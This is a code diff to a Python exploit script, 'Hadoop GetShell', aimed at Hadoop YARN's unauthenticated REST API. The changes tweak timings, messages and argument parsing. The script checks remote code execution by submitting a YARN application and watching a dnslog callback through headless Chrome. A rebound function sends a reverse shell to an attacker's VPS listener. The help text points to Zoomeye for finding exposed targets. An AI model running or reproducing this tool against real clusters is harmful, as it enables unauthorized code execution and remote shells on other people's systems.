@@ -14,6 +14,7 @@ chrome_options = Options()
 chrome_options.add_argument('--headless')
 chrome_options.add_argument('--disable-gpu')
 chrome_options.add_argument('log-level=3')
+
 path = r'C:\Program Files\Google\Chrome\Application\chrome.exe'
 chrome_options.binary_location = path
 
@@ -39,13 +40,12 @@ def unauthorized_scan(target):
 def validation(target):
     app_id = get_appid(target)
     if app_id != 1:
-        browser = webdriver.Chrome(chrome_options=chrome_options)
+        browser = webdriver.Chrome(options=chrome_options)
         browser.get(platform)
-        time.sleep(3)
         browser.find_element(By.XPATH, '//div/button[1]').click()  # 找到获取域名按钮并点击
-        time.sleep(3)
+        time.sleep(1)
         myDomain = browser.find_element(By.ID, "myDomain").text  # 域名地址
-        print(myDomain, "[Get Domain OK]")
+        print("[*] Get Domain {}".format(myDomain))
         url = target + payload2
         data = {
             'application-id': app_id,
@@ -58,18 +58,18 @@ def validation(target):
             'application-type': 'YARN',
         }
         requests.post(url, json=data)
-        time.sleep(8)
+        time.sleep(3)
         browser.find_element(By.XPATH, '//div/button[2]').click()  # 找到刷新按钮并点击
-        time.sleep(8)       #根据dnslog平台延迟 自行修改
+        time.sleep(3)  # 根据dnslog平台延迟 自行修改
         try:
             DNS = browser.find_element(By.XPATH, '//table/tbody/tr/td[1]').text
             ip = browser.find_element(By.XPATH, '//table/tbody/tr/td[2]').text
             Time = browser.find_element(By.XPATH, '//table/tbody/tr/td[3]').text
-            print("dnslog:", DNS, ip, Time)
+            print("INFO:", DNS, ip, Time)
             print("[!] %s Hadoop RCE vulnerability exists" % target)
             browser.close()
         except Exception:
-            print("[!] response timeout")
+            print("[*] %s Hadoop RCE Vulnerability does not exis" % target)
             browser.close()
     else:
         print("[*] %s Hadoop RCE Vulnerability does not exis" % target)
@@ -96,9 +96,9 @@ def rebound(target, address):
     print("Check the VPS NC listening status!")
 
 
-def run():
-    parser = argparse.ArgumentParser(usage="python Hadoop.py http://target.com",
-                                     description="Hadoop GetShell")
+def cmd():
+    parser = argparse.ArgumentParser(usage="python Hadoop.py -t http://target.com",
+                                     description="Hadoop GetShell [Zoomeye:app:Hadoop YARN]")
     parser.add_argument("-t", "--target", help="attack target", type=str)
     parser.add_argument("-a", "--address", help="Remote VPS listening address(127.0.0.1:9999)", type=str, default="")
     args = parser.parse_args()
@@ -109,15 +109,19 @@ if __name__ == '__main__':
     if len(sys.argv) == 1:
         print("Usage: python Hadoop.py -h")
         sys.exit()
-    args = run()
+    args = cmd()
     target = args.target
     address = args.address
 
-    if target != "" and address == "":
-        code = unauthorized_scan(target)
-        if code == 1:
-            validation(target)
-        else:
-            print("Target inaccessible!")
-    if target != "" and address != "":
-        rebound(target, address)
+    t = target[-1]
+    if t != "/":
+        if target != "" and address == "":
+            code = unauthorized_scan(target)
+            if code == 1:
+                validation(target)
+            else:
+                print("[*] %s Hadoop unauthorized vulnerability does not exist" % target)
+        if target != "" and address != "":
+            rebound(target, address)
+    else:
+        print("Usage: python Hadoop.py -t http://target.com")
